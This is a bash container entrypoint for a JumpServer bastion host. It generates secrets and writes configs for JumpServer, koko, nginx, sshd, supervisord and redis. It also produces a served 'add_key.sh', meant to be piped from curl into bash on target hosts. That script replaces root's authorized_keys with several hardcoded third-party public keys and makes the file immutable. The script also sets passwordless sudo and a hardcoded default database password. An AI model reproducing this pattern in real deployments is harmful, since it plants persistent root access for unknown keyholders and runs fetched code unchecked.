#!/usr/bin/env bash
#jumpserver Entrypoint.sh By:liuwei Mail:al6008@163.com Date:2020-01-01
source /etc/profile &>/dev/null

#env
export SECRET_KEY=${SECRET_KEY:-$(dd if=/dev/urandom bs=256 count=1 2>/dev/null | base64 | tr -d "=+/" | dd bs=64 count=1 2>/dev/null)}
export BOOTSTRAP_TOKEN=${BOOTSTRAP_TOKEN:-$(dd if=/dev/urandom bs=256 count=1 2>/dev/null | base64 | tr -d "=+/" | dd bs=64 count=1 2>/dev/null)}
export REDIS_PASSWORD=${REDIS_PASSWORD:-$(dd if=/dev/urandom bs=256 count=1 2>/dev/null | base64 | tr -d "=+/" | dd bs=32 count=1 2>/dev/null)}
export GUCAMOLE_URL=${GUCAMOLE_URL:-"127.0.0.1:8090"}
export VERSION="$(cat /etc/version.env 2>/dev/null)"
export VERSION="${VERSION:-"v2.8.0"}"

#supervisord user
export User_File=/opt/config/supervisord.dat
mkdir -p $(dirname "${User_File}")
if [ -e "${User_File}" ];then
  export SUPERVISOR_USERNAME=$(cat "${User_File}" |awk -F':' '{print $1}')
  export SUPERVISOR_PASSWORD=$(cat "${User_File}" |awk -F':' '{print $2}')
fi
export SUPERVISOR_USERNAME=${SUPERVISOR_USERNAME:-admin}
export SUPERVISOR_PASSWORD=${SUPERVISOR_PASSWORD:-$(dd if=/dev/urandom bs=64 count=1 2>/dev/null | base64 | tr -d "=+/" | dd bs=32 count=1 2>/dev/null)}
test -f "${User_File}" ||cat > "${User_File}" <<EOF
${SUPERVISOR_USERNAME}:${SUPERVISOR_PASSWORD}
EOF
test ! -e /opt/config/htpasswd && /usr/bin/htpasswd -cb /opt/config/htpasswd ${SUPERVISOR_USERNAME} ${SUPERVISOR_PASSWORD}

#user
useradd nginx &>/dev/null

#jumpserver config
mkdir -p /opt/config/
test -f /opt/config/jumpserver_config.yml||cat > /opt/config/jumpserver_config.yml <<EOF
SECRET_KEY: ${SECRET_KEY}
BOOTSTRAP_TOKEN: ${BOOTSTRAP_TOKEN}
SESSION_COOKIE_AGE: ${SESSION_COOKIE_AGE:-"604800"}
SESSION_EXPIRE_AT_BROWSER_CLOSE: ${SESSION_EXPIRE_AT_BROWSER_CLOSE:-"True"}
DB_ENGINE: ${DB_ENGINE:-"postgresql"}
DB_HOST: ${DB_HOST:-"192.168.0.193"}
DB_PORT: ${DB_PORT:-"5432"}
DB_USER: ${DB_USER:-"jumpserver"}
DB_PASSWORD: ${DB_PASSWORD:-"Jumpserver_Admin_By_liuwei_al6008@163.com"}
DB_NAME: ${DB_NAME:-"jumpserver"}
HTTP_BIND_HOST: ${HTTP_BIND_HOST:-"0.0.0.0"}
HTTP_LISTEN_PORT: 8080
WS_LISTEN_PORT: 8070
DEBUG: ${DEBUG:-"False"}
LOG_LEVEL: ${LOG_LEVEL:-"CRITICAL"}
REDIS_HOST: ${REDIS_HOST:-"127.0.0.1"}
REDIS_PORT: ${REDIS_PORT:-"6379"}
REDIS_PASSWORD: ${REDIS_PASSWORD}
PERM_SINGLE_ASSET_TO_UNGROUP_NODE: ${PERM_SINGLE_ASSET_TO_UNGROUP_NODE:-"True"}
EOF
\cp  -f -a /opt/config/jumpserver_config.yml /opt/jumpserver/config.yml

#koko config
test -f /opt/config/jumpserver_koko.yml||cat > /opt/config/jumpserver_koko.yml <<EOF
#NAME: {{ Hostname }}
CORE_HOST: ${CORE_HOST:-"http://127.0.0.1:80"}
BOOTSTRAP_TOKEN: ${BOOTSTRAP_TOKEN}
BIND_HOST: 0.0.0.0
SSHD_PORT: ${SSHD_PORT:-"2222"}
HTTPD_PORT: 5000
ACCESS_KEY_FILE: /opt/config/koko/keys/access_key
LOG_LEVEL: ${LOG_LEVEL:-"CRITICAL"}
SSH_TIMEOUT: ${SSH_TIMEOUT:-"180"}
LANGUAGE_CODE: ${KOKO_LANG:-"zh"}
SFTP_ROOT: ${SFTP_ROOT:-"/tmp"}
SFTP_SHOW_HIDDEN_FILE: ${SFTP_SHOW_HIDDEN_FILE:-"True"}
REUSE_CONNECTION: ${REUSE_CONNECTION:-"true"}
ASSET_LOAD_POLICY: ${ASSET_LOAD_POLICY:-""}
ZIP_MAX_SIZE: ${ZIP_MAX_SIZE:-"8129M"}
ZIP_TMP_PATH: /tmp
CLIENT_ALIVE_INTERVAL: 60
RETRY_ALIVE_COUNT_MAX: 5
SHARE_ROOM_TYPE: redis
REDIS_HOST: ${REDIS_HOST:-"127.0.0.1"}
REDIS_PORT: ${REDIS_PORT:-"6379"}
REDIS_PASSWORD: ${REDIS_PASSWORD}
EOF
\cp  -f -a  /opt/config/jumpserver_koko.yml /opt/koko/config.yml
mkdir -p /opt/config/koko/keys/

#nginx config
if [[ ! -e /opt/config/nginx.conf ]];then
    \cp -a /etc/nginx/nginx.conf.tmp /opt/config/nginx.conf
fi
sed -i "s@GUCAMOLE_URL@${GUCAMOLE_URL:-"127.0.0.1:8081"}@g" /opt/config/nginx.conf
rm -f /etc/nginx/nginx.conf
ln -sf /opt/config/nginx.conf /etc/nginx/nginx.conf

#创建ssh密钥
mkdir -p /opt/config/
if [ ! -z "${SSH_KEY}" ];then
    echo ${SSH_KEY} |base64 -d > /opt/config/id_rsa
    chmod 600 /opt/config/id_rsa
fi
if [ ! -e /opt/config/id_rsa ];then
    ssh-keygen -t rsa -b ${SSH_KEY_SIZE:-"16384"} -m pem -C "JumpServer-Ssh_Key_Size:${SSH_KEY_SIZE:-"16384"}-By:liuwei-Mail:al6008@163.com-${HOSTNAME}-$(date +'%F_%T')" -f /opt/config/id_rsa -P ''  &>/dev/null
fi
if [ ! -e /opt/config/id_rsa.pub ];then
    export commit=JumpServer-Ssh-Key
    ssh-keygen -y -f /opt/config/id_rsa  |sed "s@\$@ ${commit}@g" > /opt/config/id_rsa.pub
fi

#redis密码
mkdir -p /opt/reids_data
export REDIS_PASSWORD=$(grep REDIS_PASSWORD /opt/jumpserver/config.yml 2>/dev/null|awk '{print $2}' )

#SSHD
grep -q "#By:liuwei Mail:al6008@163.com" /etc/ssh/sshd_config ||cat > /etc/ssh/sshd_config <<EOF
#By:liuwei Mail:al6008@163.com
AddressFamily inet
Port 22
Protocol 2
LogLevel error
HostKey /etc/ssh/ssh_host_rsa_key
AuthorizedKeysFile  .ssh/authorized_keys
UsePrivilegeSeparation sandbox
LoginGraceTime 15
PermitRootLogin without-password
StrictModes yes
MaxSessions 2
MaxAuthTries 3
MaxStartups 3
TCPKeepAlive no
ClientAliveInterval 300
ClientAliveCountMax 2
IgnoreUserKnownHosts yes
ChallengeResponseAuthentication no
Compression no
AllowTcpForwarding yes
AllowAgentForwarding yes
PermitEmptyPasswords no
PasswordAuthentication no
Banner none
PrintMotd no
PrintLastLog yes
UseDNS no
UsePAM yes
Subsystem    sftp    /usr/libexec/openssh/sftp-server
EOF
mkdir -p /run/sshd

#创建supervisord配置文件
test -f /opt/config/supervisord.conf ||cat > /opt/config/supervisord.conf <<EOF
[unix_http_server]
file=/dev/shm/supervisor.sock
username=${SUPERVISOR_USERNAME}
password=${SUPERVISOR_PASSWORD}

[inet_http_server]
port=127.0.0.1:10999
username=${SUPERVISOR_USERNAME}
password=${SUPERVISOR_PASSWORD}

[supervisord]
nodaemon=true
user=root
loglevel=critical
logfile=/dev/null
logfile_maxbytes=50MB
logfile_backups=10
pidfile=/dev/shm/supervisord.pid

[supervisorctl]
serverurl=http://127.0.0.1:10999
username=${SUPERVISOR_USERNAME}
password=${SUPERVISOR_PASSWORD}

[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

[program:sys_crontab]
command=/usr/sbin/cron -f
pidfile=/var/run/crond.pid
autostart=true
autorestart=true
stdout_logfile=/dev/null
stderr_logfile=/dev/null

[program:sys_sshd]
command=/usr/sbin/sshd -d
pidfile=/var/run/sshd.pid
autostart=true
autorestart=true
stdout_logfile=/dev/null
stderr_logfile=/dev/null

[program:jumpserver_nginx]
command=/usr/sbin/nginx -c /opt/config/nginx.conf
autostart=true
autorestart=true
stdout_logfile=/dev/null
stderr_logfile=/dev/null

[program:jumpserver_server]
directory=/opt/jumpserver
user=root
command=/opt/jumpserver/jms start all
pidfile=/dev/shm/jumpserver.pid
autostart=true
autorestart=true
stdout_logfile=/dev/null
stderr_logfile=/dev/null

[program:jumpserver_koko]
user=root
directory=/opt/koko
command=/opt/koko/koko
pidfile=/dev/shm/koko.pid
autostart=true
autorestart=true
stdout_logfile=/dev/null
stderr_logfile=/dev/null

[program:redis]
user=nginx
directory=/tmp
command=/usr/bin/redis-server --maxmemory $((108*1024*1024)) --bind 127.0.0.1 --protected-mode yes --requirepass ${REDIS_PASSWORD} --loglevel warning --daemonize no --save 900 1 --save 300 10 --save 60 30  --dir /opt/reids_data
pidfile=/dev/shm/redis.pid
autostart=true
autorestart=true
stdout_logfile=/dev/null
stderr_logfile=/dev/null
EOF

#crontab
test -e /etc/cron.d/backup ||cat > /etc/cron.d/backup <<EOF
SHELL=/bin/bash
PATH=${PATH}
05 */8 * * * root /bin/bash /sbin/backup.sh &>/dev/null
EOF

#Nginx Soft
mkdir -p /opt/config/soft/
#添加主机脚本
test -e /opt/config/soft/add_host.sh ||\cp /sbin/add_host.sh /opt/config/soft/add_host.sh
test -e /opt/config/soft/add_key.sh||cat > /opt/config/soft/add_key.sh <<CONEOF
#!/usr/bin/env bash
#Jumpserver root authorized_keys By:liuwei Mail:al6008@163.com
#curl -sfkL -u ${SUPERVISOR_USERNAME}:${SUPERVISOR_PASSWORD} JMS_URL/soft/add_key.sh|/bin/bash -s 资产区域 资产名称

$(cat /sbin/jms_api)

mkdir -p /root/.ssh/
chattr -i /root/.ssh/authorized_keys
test -e /root/.ssh/authorized_keys_jumpserver ||cp /root/.ssh/authorized_keys /root/.ssh/authorized_keys_jumpserver
grep -q "#Jumpserver Jumpserver root authorized_keys By:liuwei Mail:al6008@163.com" /root/.ssh/authorized_keys|| cat > /root/.ssh/authorized_keys <<EOF
#Jumpserver Jumpserver root authorized_keys By:liuwei Mail:al6008@163.com
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH6pyOPRUoyBjBCNgFRIG4eSEkfA5lH8Al5dND1rJbmc root@localhost
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDKkEhYr/JfwR25X0nC+u7xB+cKDUCQyJkDod4YfHk2DLd31Z/01bJWa5bxotfxb5xVZxPCTgqsA1aml065AVh+caCVHxUlNHw+fpKHwUSDRhIJRrl7uB84IOXKneAyib1lw4UXeVP5M1ZTCnzOcfvE5Q8zpnDNxDUo64l1aQLN+xJVdMR9pHCrKCgl+4qYRdbiwfQupQLSK+84DF//PV630YVTa5HBW30J+vAunRDIeg1jYTThpXJnTMWZnm4mjLzpBd1AG3rWuhYIvrw2fF+lTTJ72oMg35S3hju/Up8AZEChWO9jQ/8RkHVh6G4IJQDpNq+Z/oAlt9s1O6Jnv7TXO42ffU4Q61yuDk3TYtIu+SQCsQHCPBK3ZYaP+in4fI0anfGDIxbXnZf4zyeARhlj5ZahQSNaxI6dkpM+J5aOTflL4tblGzoD0yH8JYWdnax2GoHuqJUPCIQSTRC8/1o8jo8+UFNBM6rIpycAOGqbjCPJVO8oBc3JLk6KnH881VIVVTchNKmxiL6tavkIGoyq7FohWbWOdnvP60yixyncY7+DBSufL+S7N5RaxKRalaGLVhhA4DuqVBkgYhPwrK/H3pC3UtQpnJYIt5SBmuXQP/ISe4Iq8+dL1KaeywolRoTeASm0IdT8gYGehixY6kq7dohgD3+3fwnO+NXBhCrrow== root@localhost
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAADQgN2dt3dRdnESqb8uj2nqUx2jK+OT/CnARMN3OxxTeXEVTDnbHaXVAWVXZcernUr1W4UW5Z+Fb9NRpgFJlUtAWO48vzTcbjeOWqm5ckTE4CubW4zT5OEGQITdfwK24itZpHZfeUlovVMIFNq9pKORXEsV3KHYh8k/io3UzucKuZk8wEUIKh2luu9deagDz9pk0PyI377opuz6svZFTBL6Ib3R18nQvjGNxVm+7LTNsk478e2N0iCSRFOeAhlPErdwT78xIjGSIK+mmSh6yEjVuXzjj1swsGylU2nT9d/eD/VWkgv0R1a+4PzYFnz/CWMGfR+Iw1epaodCZ4Un1gmgzwESKgevTwQWNspdfY7wAG1cNGR5KzTRsdDeh4TaqfwOOkQ3kQJgoFDtULr/yk3bTQSJVL4UCsOMKUU1JT6Y09kYugHauOZg2JvFcpD9ZCVt82gq+2Ojj5U5XEezyurT+C/oWXVu+zPO482ILbTlnYHunIiRJQXfIE9iwgx8QCh6DKuE7fLxqoLgAhIevbSVDMEtSncvA1pblXG4DK/TgHYIY6zGimqI2f90tsrD8w9hV5jiybmMKS7a3MM/Hn4r2tgPdVt8TS1W2TRpwus07Zn19zMnJdWI/8+JmaDKDYHuzdVEnJR6SrxIWYZeu901bvu7DeUpAtJXq2DYAua/flzzz+RoyR6JShbBzjjV6n05fucgVuV9uBxQhtl4S5TEF5d+3RhYSSqjHNEYnIzacRiFpOdMY3Ri5XEGV7ZsSubRPNadvvqU1NekcWj7akgNqz0wMA8+cr51ZPY+py/dIHl4ON/o2X4++NReWybY9fO0fCLRwruwfW3utYwODpXv9Tbb04rC4gxQU4TKBNa/5SFHcsi/JpV3DUsBA97sREVWrg35N+K5/VK7Mcj3LteZib5gjBgOF9NDsdxt3IhvWKWygRz+18EnjdDQ+/UUeRkU9kzX53RrhEHZjeCaxx4Ulh/h2FPXgPEPUk47SrfpYioRt6VTeNBv2lH5lq9A8LsfcGr/cAvxtGJc4DWWtEXUfBUOcQB2yqCWoeQ+BpOb8Z9u2G+wru1yaWedOmlgGqK2JC0ADGcH67uyOA79LLSxJggMQ== jenkins@localhost
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAEWACoNTMW3hJqH9JbKG6oDXleHlA9a4fg+CCCrSwfXrzByzEaMbL8BUckD7OYiyHgEFJXltv5zHoWRcDlAiIiMegjXWoSneAVfBCUA6Kl9eulEct9qfmqk75vPRrZjXfx9o6+nbxF/TorlcpiIV5wi5zXl0Wnd9aK6bb0OtQj2lJ662GYzAe8T/bSmaWIohaf6zT01m2f1l4iwqgt7IeKpwigdFlSkWrDRfCHzRrueH1diLJnf4bYvcyneWtt/l6i4Rm4/c9Wp05m2C+4NJLZom0+DHEYNaGP8Rkw1+QNq3W9xwVtfJWD/aBaOxsNiT26NN3MqTDWmDfp0tWtALwQ0mSZyOkyPs/fq9pX3MtostumQUi07l1VghK1T0bvldMb6XYkL7RslNPMpvx/NYJvsuiz7mDj7yAcy2CEaL4ku2gpV1oZf/5yhn7NA/XlH7d5Yf1nzga7lNKIU6SM59PsVftRCzpkD2quOUHuMGRlZq2sMZiB+EWcQFKnzv9NzMbQhyOfsgPTzmYlmM15HfowmGJI0X1VGjtn/Iz02bewD2/RiQIaGYWGJtGnN6iGRTCEnmZKg4kl870pOXJbPB9n2iq/Uzh9IO6+vNcAw3YiIwjAOfZYqsmsDWxPtMfMdKd5QC66pHYbwl0Cd6AVN2rQPkEA1euDwQoAWNy21vbbBsFNDf/2+kkoEw6X3or1y7eXb23lMIKSZGArp/uS8+glt2xOtVcSM1YdrTLik2uLkL0ERkMCHy/DrL9HxJv8EJG3xi5YL6bp/xzhCaUp+vvEU0iZCXZkBweacjZrL1xEt9BXadoZ29A63SyMyAUhYFbkiXhpfDKwxt1OChxnVtEZVp+dbwZiBu9aMtL4AJC5fpD7tzjS9kIvPm8Tvt1+9YDNDk8W5GMx22Hf+6ZVQ3Fmt6ZibaGoPbIztO6lKK51vgHAV9IYAfFUPuiNriYiST96iUzTtPkbEuXCGgViEJ/6xbXiaU984xOlhzUQQsX/RVKm0B7vQ+iwUxQWDei6o3yMNZ8TzepEJ+6i/53iRbniNZu5wLZV85Ua5w1lhSXs0gP9Wrrv7T1Q0CMkfTs/gUfobKJ0R9Bcj43u32VC1vdFOKw0Z+o5NFEwvDznlKqA8EKLNCi5Nv2y7mxp+sld7tB6FwMhnbkmEKUCcucBnKnGeR6XBO3K8Ha4rK6yLTxg9g3cyW8PRhIBDEyn4kPHOWcac48Un6mcsRbAv789rRfehgtXD2uLjK+Q89KMQ2su4kTetVy+7FW1B07sZENJj6M2Zlr35UiszhupdxJ+6iQDpKeI9NLzlyD+UxdJTsBmDQMVge0Cj653YSXepVb1sKmuNmdkizRPxapV014WOOrbAPqrhJ4pKrznUPpY8z8vHIfcPc+M4+Am3Ew2QgVqLLC6tAGv4B6BtR+c4x/87jLrV3UrQR9gYPzAuwpjwmOdE4XmRRChE3gCv65KTcEZysFLjD1mJbn9e6rh root@localhost
$(cat /opt/config/id_rsa.pub)
EOF
chmod -R 700 /root/.ssh/
chmod 600  /root/.ssh/authorized_keys
chattr +i /root/.ssh/authorized_keys
exit 0
CONEOF
sed -i "s@JMS_URL@${JMS_URL:-"http://172.16.155.219:8080"}@g" /opt/config/soft/add_key.sh
sed -i "s@JMS_URL@${JMS_URL:-"http://172.16.155.219:8080"}@g" /opt/config/soft/add_host.sh

#add jumpserver
echo -e "\n\n\n\n\n\n\n" |adduser jumpserver &>/dev/null
mkdir -p /home/jumpserver/.ssh/ /root/.ssh/
test -e /home/jumpserver/.ssh/authorized_keys ||\cp /opt/config/id_rsa.pub /home/jumpserver/.ssh/authorized_keys
test -e /root/.ssh/authorized_keys||cp /opt/config/id_rsa.pub /root/.ssh/authorized_keys
chown -R jumpserver:jumpserver /home/jumpserver/
echo "jumpserver ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/jumpserver



#supervisord
(nohup /bin/bash /sbin/api_init &>/dev/null &)
echo -e \
"----------------------------------------------------------------------------------------------\n\
    $(date +"%F %T") \033[32;5m   User: ${SUPERVISOR_USERNAME}\033[0m \033[36m  Pass: ${SUPERVISOR_PASSWORD} \033[0m \n\
    $(date +"%F %T") \033[32;5m   JumpServer ${VERSION} \033[0m \033[31m By:liuwei Mail:al6008@163.com \033[0m \n\
----------------------------------------------------------------------------------------------"
touch /tmp/jumpserver.run
rm -f /etc/supervisor/supervisord.conf
ln -sf /opt/config/supervisord.conf /etc/supervisor/supervisord.conf
sed -i "/username/s@username=.*@username=${SUPERVISOR_USERNAME}@g" "${User_File}"
sed -i "/password/s@password=.*@password=${SUPERVISOR_PASSWORD}@g" "${User_File}"
mkdir -p /opt/jumpserver/data/ /opt/reids_data /opt/config/soft /opt/config/data
chmod 700 /opt/reids_data /opt/config /opt/jumpserver /opt/koko /opt/config/soft /opt/config/data /opt/reids_data
chown -R -L nginx:nginx /opt/{reids_data,config,jumpserver,koko,luna,lina}
exec /usr/bin/supervisord -c /opt/config/supervisord.conf && exit 0
exit 1
